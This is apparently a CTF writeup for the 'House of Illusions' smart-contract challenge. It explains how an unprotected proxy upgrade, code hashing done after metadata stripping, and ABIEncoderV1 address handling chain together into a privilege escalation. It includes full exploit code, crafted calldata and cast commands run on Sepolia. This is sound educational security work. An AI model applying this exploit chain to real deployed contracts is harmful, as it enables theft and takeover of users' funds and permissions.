@@ -1,0 +1,509 @@
+---
+title: '0xL4ugh CTF V5 - House of Illusions'
+description: 'A detailed writeup for the House of Illusions challenge from 0xL4ugh CTF V5. A Hard Blockchain/Smart Contract Security challenge involving proxy patterns, ABI encoding exploits, and compiler differences.'
+date: 2026-01-24
+tags: ['writeup', 'blockchain', 'smart-contracts', 'solidity', 'ethereum', 'hard', 'abi-encoding', 'proxy']
+authors: ['kudaliar']
+draft: false
+---
+
+## Executive Summary
+
+**Challenge:** House of Illusions
+**CTF:** 0xL4ugh CTF V5
+**Category:** Web3 / Smart Contract Security
+**Difficulty:** Hard
+**Flag:** `0xL4ugh{M4573R_0F_M1ND64M35}`
+
+This writeup details the solution for the "House of Illusions" blockchain challenge. The objective was to elevate privileges from a **Visitor** to a **Curator** in a system utilizing a proxy pattern with hidden vulnerabilities. The solution required chaining multiple exploits: bypassing code hash verification by leveraging compiler metadata stripping, downgrading to ABIEncoderV1 to bypass address validation, and crafting malicious calldata to satisfy an impossible constraint.
+
+---
+
+## Challenge Overview
+
+### Objective
+Start as a **Visitor** and find a way to become a **Curator** to solve the challenge.
+
+### Given Information
+- **Setup Contract:** `0x8e866fac4755948c01fbb96717470c91193799B3`
+- **Your Private Key:** `[REDACTED]`
+- **Your Address (Visitor):** `[REDACTED]`
+- **RPC:** Ethereum Sepolia Testnet
+
+### Success Condition
+The `Setup.isSolved()` function returns `true` when:
+```solidity
+IllusionHouse(house).roles(VISITOR) == IllusionHouse.Role.Curator
+```
+
+## Understanding the Contracts
+
+### 1. Setup.sol - The Factory Contract
+
+```solidity
+contract Setup {
+    address public immutable VISITOR;
+    address public immutable house;
+    MirrorProxy public proxy;
+
+    constructor(address visitor) payable {
+        VISITOR = visitor;
+        IllusionHouse implementation = new IllusionHouse();
+        bytes memory initData =
+            abi.encodeWithSignature("initialize(address)", address(this));
+        proxy = new MirrorProxy{value: msg.value}(
+            address(implementation),
+            initData,
+            visitor
+        );
+        house = address(proxy);
+    }
+
+    function isSolved() external view returns (bool) {
+        return IllusionHouse(house).roles(VISITOR) == IllusionHouse.Role.Curator;
+    }
+}
+```
+
+**Key Points:**
+- Deploys a proxy contract pointing to `IllusionHouse` implementation
+- The proxy address becomes the `house`
+- Sets the visitor as the proxy admin
+- Initializes the house (which makes `address(this)` a Curator)
+
+---
+
+### 2. MirrorProxy.sol - The Proxy Contract
+
+```solidity
+contract MirrorProxy {
+    bytes32 private constant IMPLEMENTATION_SLOT =
+        bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
+    bytes32 private constant ADMIN_SLOT =
+        bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
+    bytes32 private constant REFRAME_SLOT =
+        bytes32(uint256(keccak256("illusion.proxy.reframed")) - 1);
+
+    bytes32 public constant ALLOWED_CODEHASH =
+        0xf3138fd84a8d5cbde37c26366b84737db9968d3dc4a295948904ce513750b981;
+
+    function reframe(address newImplementation) external {
+        require(!_getReframed(), "reframe used");
+        require(
+            _codeHash(newImplementation) == ALLOWED_CODEHASH,
+            "invalid impl"
+        );
+        _setReframed(true);
+        _setImplementation(newImplementation);
+    }
+
+    function _codeHash(address target) internal view returns (bytes32 hash) {
+        assembly {
+            let size := extcodesize(target)
+            // ... get code, strip CBOR metadata, hash it
+            hash := keccak256(ptr, sub(size, add(metaLen, 2)))
+        }
+    }
+}
+```
+
+**Key Points:**
+- Standard EIP-1967 proxy pattern with delegatecall
+- **`reframe()`** allows changing the implementation ONCE
+- NO access control on `reframe()` - **anyone can call it!**
+- The new implementation must match `ALLOWED_CODEHASH`
+- The hash is computed AFTER stripping CBOR metadata
+
+---
+
+### 3. IllusionHouse.sol - The Logic Contract
+
+```solidity
+contract IllusionHouse {
+    enum Role { Visitor, Curator }
+
+    mapping(address => Role) public roles;
+    mapping(address => uint96) public maskRank;
+    mapping(address => bool) public admitted;
+    bool public opened;
+
+    bytes32 public constant SIGIL_PREIMAGE = bytes32("0xAnan or Tensai?");
+    bytes32 public constant SIGIL_HASH = keccak256(abi.encodePacked(SIGIL_PREIMAGE));
+
+    function admit(address patron, bytes calldata sigil) external {
+        require(!admitted[msg.sender], "already admitted");
+        require(msg.data.length == 4 + 96, "invalid sigil payload");
+        require(
+            uint256(bytes32(msg.data[36:68])) == 0x20,
+            "invalid sigil offset"
+        );
+
+        // THE KEY CHECK!
+        uint256 patronWord = uint256(bytes32(msg.data[4:36]));
+        require(patronWord >> 160 != 0, "invalid patron encoding");
+
+        require(roles[patron] == Role.Curator, "invalid patron");
+        require(sigil.length == 32, "invalid sigil length");
+        require(keccak256(sigil) == SIGIL_HASH, "invalid sigil");
+
+        bytes32 sigilWord = abi.decode(sigil, (bytes32));
+        uint96 rank = uint96(uint256(sigilWord) >> 160);
+
+        admitted[msg.sender] = true;
+        roles[msg.sender] = Role.Visitor;
+        if (rank > 0) {
+            maskRank[msg.sender] = rank;
+        }
+    }
+
+    function appointCurator(address newCurator) external {
+        require(maskRank[msg.sender] > 0, "not masked");
+        roles[newCurator] = Role.Curator;
+        admitted[newCurator] = true;
+    }
+}
+```
+
+**Key Points:**
+- **`admit()`** is the entry point - gets you in the door
+- **`appointCurator()`** promotes someone to Curator (requires `maskRank > 0`)
+- The `patron` parameter must be a Curator (the proxy/house is one)
+- **Critical check:** `patronWord >> 160 != 0` requires upper bits to be set
+- If you get a non-zero `maskRank` from `admit()`, you can appoint yourself Curator!
+
+---
+
+## Initial Analysis
+
+### The Impossible Requirement
+
+Let's focus on the `admit()` function's check:
+
+```solidity
+uint256 patronWord = uint256(bytes32(msg.data[4:36]));
+require(patronWord >> 160 != 0, "invalid patron encoding");
+```
+
+This reads the first parameter from raw calldata and checks if the upper 96 bits are non-zero. But there's a problem...
+
+**In Solidity 0.8.28 with default settings (ABIEncoderV2):**
+- When you call `admit(address patron, bytes sigil)`, the ABI decoder validates parameters
+- For `address` types, it **rejects any value where the upper 96 bits are non-zero**
+- This means `patronWord >> 160` will ALWAYS be zero!
+- The check is **UNREACHABLE** under normal circumstances
+
+### Why Does This Check Exist?
+
+This is a hint from the challenge author! The check is testing something that should be impossible, which means:
+1. We need to find a way to bypass the ABI decoder's validation
+2. The vulnerability involves changing how parameters are decoded
+
+---
+
+## The Vulnerability Chain
+
+### Discovery 1: The Hash Mismatch
+
+When analyzing the on-chain implementation, I computed its code hash:
+
+```bash
+# On-chain implementation code hash (without metadata)
+0x63bb0345dda10abe72a48f5518582640dcebb50e889687b5bb0549ab9b37160c
+
+# ALLOWED_CODEHASH from proxy
+0xf3138fd84a8d5cbde37c26366b84737db9968d3dc4a295948904ce513750b981
+```
+
+**They don't match!** This means `reframe()` is expecting a DIFFERENT compilation of `IllusionHouse`.
+
+### Discovery 2: ABIEncoderV1 vs ABIEncoderV2
+
+Solidity has two ABI encoding modes:
+
+**ABIEncoderV1 (legacy):**
+- Does NOT validate that addresses have zero upper bits
+- Less strict parameter validation
+- Declared with `pragma abicoder v1;`
+
+**ABIEncoderV2 (default since 0.8.0):**
+- Validates addresses strictly (upper 96 bits must be zero)
+- Stricter parameter validation
+- Default in modern Solidity
+
+### Discovery 3: Metadata Stripping
+
+The proxy's `_codeHash()` function strips CBOR metadata before hashing:
+
+```solidity
+// Last two bytes are CBOR length; strip metadata before hashing.
+let metaLen := shr(240, mload(add(ptr, sub(size, 2))))
+hash := keccak256(ptr, sub(size, add(metaLen, 2)))
+```
+
+This means two versions of the same contract (with different compiler settings) can have:
+- Different raw bytecode (because of different ABI encoders)
+- Different metadata (compiler settings)
+- But when metadata is stripped, the v1 version's hash matches `ALLOWED_CODEHASH`!
+
+### The Attack Vector
+
+1. **Deploy `IllusionHouseV1`** with `pragma abicoder v1;` (no address validation)
+2. **Call `reframe(v1_address)`** to swap the implementation (no access control!)
+3. **Call `admit()` with crafted calldata** that has dirty upper bits
+4. **Call `appointCurator(yourself)`** to become Curator
+
+---
+
+## Exploit Development
+
+### Step 1: Create IllusionHouseV1
+
+Create an identical contract with the ABI encoder pragma:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+pragma abicoder v1;  // THIS IS THE KEY!
+
+contract IllusionHouseV1 {
+    // ... exact same code as IllusionHouse ...
+}
+```
+
+**Verification:**
+```solidity
+function testCodeHashV1() public {
+    IllusionHouseV1 v1 = new IllusionHouseV1();
+    bytes32 hash = _codeHash(address(v1));
+
+    // hash == 0xf3138fd84a8d5cbde37c26366b84737db9968d3dc4a295948904ce513750b981
+    // Matches ALLOWED_CODEHASH! ✓
+}
+```
+
+### Step 2: Craft the Admit Calldata
+
+We need to call `admit(address patron, bytes sigil)` with:
+- `patron` = the proxy address (it's a Curator)
+- **BUT with upper 96 bits set** (to pass `patronWord >> 160 != 0`)
+- `sigil` = `SIGIL_PREIMAGE` to pass the hash check
+
+**Calldata Structure:**
+```
+Offset | Size | Content
+-------|------|----------------------------------
+0-3    | 4    | Function selector: 0xf5b1e981
+4-35   | 32   | patronWord (dirty address)
+36-67  | 32   | Offset to sigil bytes (0x20)
+68-99  | 32   | Sigil data (SIGIL_PREIMAGE)
+```
+
+**The Dirty Patron Encoding:**
+```solidity
+// Clean proxy address (160 bits)
+address patron = 0x8e866fac4755948c01fbb96717470c91193799B3;
+
+// Add a 1 in bit position 160 (or any upper bit)
+uint256 dirtyPatron = uint256(uint160(patron)) | (uint256(1) << 160);
+// Result: 0x0000000000000000000000018e866fac4755948c01fbb96717470c91193799b3
+//                              ^^
+//                              This bit is set!
+```
+
+**The Sigil Encoding:**
+```solidity
+bytes32 SIGIL_PREIMAGE = bytes32("0xAnan or Tensai?");
+// = 0x3078416e616e206f722054656e7361693f000000000000000000000000000000
+
+// When decoded and shifted right 160 bits:
+uint96 rank = uint96(uint256(SIGIL_PREIMAGE) >> 160);
+// = 15000660559762137966889161829 (non-zero!)
+```
+
+**Building the Raw Calldata:**
+```solidity
+bytes4 selector = 0xf5b1e981; // admit(address,bytes)
+bytes memory callData = abi.encodePacked(
+    selector,                      // 4 bytes
+    bytes32(dirtyPatron),          // 32 bytes
+    bytes32(uint256(0x20)),        // 32 bytes (offset)
+    bytes32("0xAnan or Tensai?")   // 32 bytes (sigil)
+);
+// Total: 100 bytes ✓
+```
+
+### Step 3: Understanding the Checks
+
+When we call `admit()` with this crafted calldata on the v1 implementation:
+
+**Check 1:** `msg.data.length == 4 + 96`
+- ✓ Our calldata is exactly 100 bytes
+
+**Check 2:** `uint256(bytes32(msg.data[36:68])) == 0x20`
+- ✓ Bytes 36-67 contain `0x20`
+
+**Check 3:** `patronWord >> 160 != 0`
+- ✓ We set bit 160, so upper bits are non-zero
+- **This only works because v1 doesn't validate addresses!**
+
+**Check 4:** `roles[patron] == Role.Curator`
+- The `patron` parameter gets decoded as the clean address (lower 160 bits)
+- ✓ The proxy is a Curator (from initialization)
+
+**Check 5:** `keccak256(sigil) == SIGIL_HASH`
+- The `sigil` parameter is decoded from the bytes starting at offset `0x20`
+- ✓ It's `SIGIL_PREIMAGE`, which hashes correctly
+
+**Result:**
+- `admitted[msg.sender] = true`
+- `roles[msg.sender] = Role.Visitor`
+- `maskRank[msg.sender] = 15000660559762137966889161829` (non-zero!)
+
+---
+
+## Execution Steps
+
+### Local Testing
+
+First, verify the exploit works locally:
+
+```solidity
+function testFullExploit() public {
+    // Setup
+    visitor = address(0xBEEF);
+    Setup setup = new Setup{value: 0}(visitor);
+    address house = setup.house();
+    MirrorProxy proxy = MirrorProxy(payable(house));
+    IllusionHouse ih = IllusionHouse(house);
+
+    // Step 1: Deploy v1 implementation
+    IllusionHouseV1 newImpl = new IllusionHouseV1();
+
+    // Step 2: Reframe to v1
+    proxy.reframe(address(newImpl));
+    assertTrue(proxy.reframed());
+
+    // Step 3: Craft admit() calldata
+    bytes4 selector = IllusionHouse.admit.selector;
+    uint256 dirtyPatron = uint256(uint160(house)) | (uint256(1) << 160);
+    bytes32 sigilPreimage = bytes32("0xAnan or Tensai?");
+    bytes memory callData = abi.encodePacked(
+        selector,
+        bytes32(dirtyPatron),
+        bytes32(uint256(0x20)),
+        sigilPreimage
+    );
+
+    // Step 4: Call admit()
+    vm.prank(visitor);
+    (bool success,) = house.call(callData);
+    assertTrue(success);
+    assertTrue(ih.admitted(visitor));
+    assertTrue(ih.maskRank(visitor) > 0);
+
+    // Step 5: Appoint yourself as Curator
+    vm.prank(visitor);
+    ih.appointCurator(visitor);
+
+    // Step 6: Verify solved
+    assertTrue(setup.isSolved());
+    // SOLVED! ✓
+}
+```
+
+### On-Chain Execution
+
+**Environment Setup:**
+```bash
+export RPC="https://ethereum-sepolia-rpc.publicnode.com"
+export KEY="[REDACTED]"
+export PROXY="0x8e866fac4755948c01fbb96717470c91193799B3"
+export VISITOR="0x5273e19215087957A6062428BF2B28dc6e15724E"
+```
+
+**Transaction 1: Deploy IllusionHouseV1**
+```bash
+forge create src/IllusionHouseV1.sol:IllusionHouseV1 \
+    --rpc-url $RPC \
+    --private-key $KEY \
+    --broadcast
+
+# Deployed to: 0x95371Ab4cd1b0FE7d328Faa447ABb7cfF85a0AcA
+# Tx Hash: 0xc5bb2b9810ee00160ef655d4c18d66d342de389731b0dacb794659bb41c9d21f
+```
+
+**Transaction 2: Reframe the Proxy**
+```bash
+cast send $PROXY "reframe(address)" 0x95371Ab4cd1b0FE7d328Faa447ABb7cfF85a0AcA \
+    --rpc-url $RPC \
+    --private-key $KEY
+
+# Status: success ✓
+# Tx Hash: 0x19378d4994dc1e43bfc4fc19c45e01796b753a0ed544c7d5666a2f9dd22645f9
+```
+
+**Transaction 3: Call admit() with Dirty Calldata**
+```bash
+# Build the calldata
+SELECTOR=$(cast sig "admit(address,bytes)")  # 0xf5b1e981
+DIRTY_PATRON="0x0000000000000000000000018e866fac4755948c01fbb96717470c91193799b3"
+OFFSET="0x0000000000000000000000000000000000000000000000000000000000000020"
+SIGIL="0x3078416e616e206f722054656e7361693f000000000000000000000000000000"
+CALLDATA="${SELECTOR}${DIRTY_PATRON:2}${OFFSET:2}${SIGIL:2}"
+
+# Send it
+cast send $PROXY $CALLDATA \
+    --rpc-url $RPC \
+    --private-key $KEY
+
+# Status: success ✓
+# Tx Hash: 0xbde627648fb914e75813f34b7fe3ed89d9c092c5d7f54c8abf814876bfc28b61
+```
+
+**Transaction 4: Appoint Yourself as Curator**
+```bash
+cast send $PROXY "appointCurator(address)" $VISITOR \
+    --rpc-url $RPC \
+    --private-key $KEY
+
+# Status: success ✓
+# Tx Hash: 0x1fe48cf9567a841f39800a744ae7d5767519b4dbb20883b231bf89d270758b68
+```
+
+**Verification:**
+```bash
+cast call $PROXY "roles(address)(uint8)" $VISITOR --rpc-url $RPC
+# Returns: 1 (Curator role) ✓
+```
+
+---
+
+## Key Takeaways
+
+1. **Proxy Patterns Can Have Hidden Attack Surfaces**
+   - The `reframe()` function had NO access control
+   - Anyone could change the implementation (once)
+   - Always check who can upgrade proxy contracts!
+
+2. **Compiler Settings Matter**
+   - `pragma abicoder v1;` vs default v2 changes security guarantees
+   - The same source code can compile to different bytecode
+   - Metadata stripping can hide these differences in hash checks
+
+3. **ABI Encoding is Not Just Formatting**
+   - ABI encoders validate data types (addresses, arrays, etc.)
+   - v1 encoder is more permissive than v2
+   - Raw `msg.data` access can bypass these validations
+
+4. **Defense in Depth Fails When Assumptions Break**
+   - The `patronWord >> 160 != 0` check assumes ABIEncoderV2 validation
+   - When that assumption breaks (via reframe), the check becomes exploitable
+
+---
+
+## References
+
+- [Solidity ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html)
+- [EIP-1967: Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)
+- [Solidity ABIEncoderV2 vs V1](https://docs.soliditylang.org/en/latest/layout-of-source-files.html#abi-coder-pragma)
+- [OpenZeppelin Proxy Patterns](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
